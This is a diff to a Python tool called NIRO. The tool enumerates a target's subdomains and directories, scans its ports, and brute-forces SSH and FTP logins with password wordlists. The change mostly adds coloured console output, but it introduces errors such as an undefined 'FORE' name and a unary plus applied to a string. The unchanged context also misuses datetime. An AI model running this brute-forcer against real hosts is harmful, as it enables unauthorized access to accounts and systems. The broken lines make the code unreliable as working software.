@@ -2,34 +2,33 @@ import pyfiglet
 import socket,requests,datetime
 import os,sys
 import paramiko
-from colorama import Fore, back, Style
+from colorama import Fore
 
 
 intro1 = pyfiglet.figlet_format("--->\\NIRO/<---")
-print(intro1)
+print(Fore.RED + intro1)
 
 intro2 = pyfiglet.figlet_format("Authored by EN-NIARI AMR \nFramed By EL MOSTAPHA CHAKIR" , font="digital")
-print(intro2)
+print(Fore.CYAN + intro2)
 
 now =datetime.now()
 dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
 
-print("************************************************")
+print(Fore.WHITE+"************************************************")
 print("---------------------------------------------------------------------------------------")
-print("+ URL      :            http://"+sys.argv[1])
-print("+ Time     :            "+ dt_string)
-print("+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning                      ")
-print("---------------------------------------------------------------------------------------")
-
+print(Fore.YELLOW + "+ URL      :            http://"+sys.argv[1])
+print(Fore.YELLOW + "+ Time     :            "+ dt_string)
+print(Fore.YELLOW + "+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning                      ")
+print(Fore.WHITE + "---------------------------------------------------------------------------------------")
 print("************************************************")
 print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
-print("[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")
+print(FORE.CYAN + "[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")
 
 
 s = pyfiglet.figlet_format("SUB-DOMAIN")
 print(s)
 
-sub_file = input("[+] Enter subdomains file location : ")
+sub_file = input(Fore.BLUE+"[+] Enter subdomains file location : ")
 sub_list = open(str(sub_file),'r')
 subdoms = sub_list.readlines()
 
@@ -40,17 +39,17 @@ for sub in subdoms:
    except requests.ConnectionError:
      pass
    else:
-     print("[+] --> Valid domain : ",sub_domains)
+     print(FORE.GREEN +"[+] --> Valid domain : ",sub_domains)
 
 sub_list.close()
 
 print("---------------END OF SUBDOMAIN ENUMERATION-----------------")
-print("[*-*] Starting NIRO in DIRECTORY enumeration mode ...")
+print(FORE.CYAN+"[*-*] Starting NIRO in DIRECTORY enumeration mode ...")
 
 d = pyfiglet.figlet_format("DIRECTORY")
 print(d)
 
-dir_file = input("[+] Enter directory name file location : ")
+dir_file = input(Fore.BLUE+"[+] Enter directory name file location : ")
 
 directory = open(str(dir_file),'r')
 directory_name = directory.readlines()
@@ -61,13 +60,13 @@ for dir in directory_name :
    if r.status_code == 404:
      pass
    else:
-    print("[+] ---> Valid Directory : ",dir_enum)
+    print(Fore.GREEN+"[+] ---> Valid Directory : ",dir_enum)
 
 file.close()
 
-print("---------------END OF DIRECTORY ENUMERATION-----------------")
+print(Fore.RED+"---------------END OF DIRECTORY ENUMERATION-----------------")
 
-print("[*-*] Starting NIRO in PORT SCANNING mode ...")
+print(FORE.CYAN + "[*-*] Starting NIRO in PORT SCANNING mode ...")
 
 p = pyfiglet.figlet_format("PORT-SCANNING")
 print(p)
@@ -95,19 +94,19 @@ for port in ports:
          open_ports.append(port)
 
 if open_ports:
-    print("Open Ports are : ")
+    print(Fore.GREEN+"Open Ports are : ")
     print(sorted(open_ports))
 else:
-    print("Looks like no ports are open") 
+    print(Fore.RED+"[-] Looks like no ports are open") 
 
-print("---------------END OF PORT SCANNING-----------------")
-print("[*-*] Starting NIRO in SSH Brute force mode ...")
+print(Fore.WHITE+"---------------END OF PORT SCANNING-----------------")
+print(FORE.CYAN + "[*-*] Starting NIRO in SSH Brute force mode ...")
 
 b = pyfiglet.figlet_format("SSH BruteForce")
 print(b)
 
-username = str(input("[+] Enter Username : "))
-password_file = input("[+] Enter password file location : ")
+username = str(input(Fore.BLUE+"[+] Enter Username : "+Fore.WHITE))
+password_file = input(Fore.BLUE+"[+] Enter password file location : "+Fore.WHITE)
 
 
 def ssh_connect(password, code=0):
@@ -122,7 +121,7 @@ def ssh_connect(password, code=0):
     return code
 
 if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
-        print(" -----------------------")
+        print(Fore.GREEN+" -----------------------")
         print("|   TCP PORT 22 OPEN    |")
         print(" -----------------------")
         ssh_file = open(str(password_file), 'r')
@@ -133,23 +132,23 @@ if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then cont
                     res = ssh_connect(password)
                     print('Trying : '+username+'/'+password)
                     if (res==0) :
-                        print("[OK] Password found: "+ password)
+                        print(Fore.GREEN+"[OK] Password found: "+ password)
                         print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                         print("username : "+ username)
                         print("Password : "+ password)
                         print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                         exit(0)
                     elif res == 1:
-                        print("[NO] No luck")
+                        print(Fore.RED+"[-] No luck")
                 except Exception as e :
                         print(e)
                         pass
 else:
-        print("(-_-) PORT 22 CLOSED...")
+        print(Fore.RED+"(-_-) PORT 22 CLOSED...")
 
-print("---------------END OF SSH BruteForce-----------------")
+print(Fore.WHITE+"---------------END OF SSH BruteForce-----------------")
 
-print("[*-*] Starting NIRO in FTP Brute force mode ...")
+print(+Fore.CYAN+"[*-*] Starting NIRO in FTP Brute force mode ...")
 
 ftp = pyfiglet.figlet_format("FTP BruteForce")
 print(ftp)
@@ -159,7 +158,7 @@ def anonymous(ip):
     try :
         ftp= FTP(ip)
         ftp.login()
-        print("-----------------------------")
+        print(Fore.GREEN+"-----------------------------")
         print("[+] Anonymous Login is OPEN")
         print("------------------------------")
         ftp.quit()
@@ -171,9 +170,9 @@ def ftp_login(ip,username,password):
         ftp = FTP(ip)
         ftp.login(username, password)
         ftp.quit()
-        print("[!] Credentials have found.")
-        print("[!] Username : " + username)
-        print("[!] Password : "+ password)
+        print(Fore.GREEN+"[!] Credentials have found.")
+        print(Fore.GREEN+"[+] Username : " + username)
+        print(Fore.GREEN+"[+] Password : "+ password)
         exit(0)
     except:
         pass
@@ -185,24 +184,24 @@ def brute_force(ip, username, wordlist):
         words = ftp_list.readlines()
         for word in words:
             word = word.strip()
-            print('Trying : '+username+'/'+word)
+            print(Fore.MAGENTA+'Trying : '+username+'/'+word)
             ftp_login(ip, username, word)
 
     except:
-        print("[-] There is no such wordlist file.")
+        print(Fore.RED+"[-] There is no such wordlist file.")
         exit(0)
 
 #Main program
 if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
-   print("----------------------------")
+   print(Fore.GREEN+"----------------------------")
    print(" [+] 21/TCP  FTP ---> OPEN ")
    print("----------------------------")
-   username_ftp = input("Enter a spesific useranme : ")
-   wordlists = input("Enter FTP list file location : ") 
+   username_ftp = input(Fore.BLUE+"Enter a spesific useranme : "+Fore.WHITE)
+   wordlists = input(Fore.BLUE+"Enter FTP list file location : "+Fore.WHITE) 
    brute_force(sys.argv[1],str(username_ftp),str(wordlists))
    anonymous(sys.argv[1])
 else :
-    print("----------------------------")
+    print(Fore.RED+"----------------------------")
     print("[!] 21/TCP FTP ---> CLOSED")
     print("----------------------------")
-print("---------------END OF FTP BruteForce-----------------")
+print(Fore.WHITE+"---------------END OF FTP BruteForce-----------------")
